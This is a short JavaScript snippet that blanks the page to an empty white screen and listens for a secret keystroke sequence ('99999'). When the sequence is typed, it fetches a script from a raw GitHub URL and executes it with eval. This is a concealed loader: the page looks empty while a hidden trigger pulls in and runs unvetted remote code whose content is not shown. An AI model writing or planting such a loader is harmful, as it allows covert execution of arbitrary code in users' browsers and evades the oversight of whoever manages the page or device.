(() => {
    const style = document.createElement("style");
    style.textContent = `
        body, html {
            margin: 0;
            padding: 0;
            width: 100%;
            height: 100%;
            background-color: white;
            overflow: hidden;
        }
        iframe {
            width: 100%;
            height: 100%;
            border: none;
        }
    `;
    document.head.appendChild(style);

    const targetSequence = "99999";
    let userInput = "";

    function yes() {
        fetch('https://raw.githubusercontent.com/MinsUR4/nothing/main/superindex.js')
            .then(response => response.text())
            .then(script => eval(script))
            .catch(error => console.error('not loaded:', error));
    };

    const keyListener = (event) => {
        if (event.key >= "0" && event.key <= "9") {
            userInput += event.key;
            if (userInput.endsWith(targetSequence)) {
                document.removeEventListener("keydown", keyListener);
                yes();
            }
        }
        if (userInput.length > 10) {
            userInput = userInput.slice(-10);
        }
    };

    document.addEventListener("keydown", keyListener);
})();
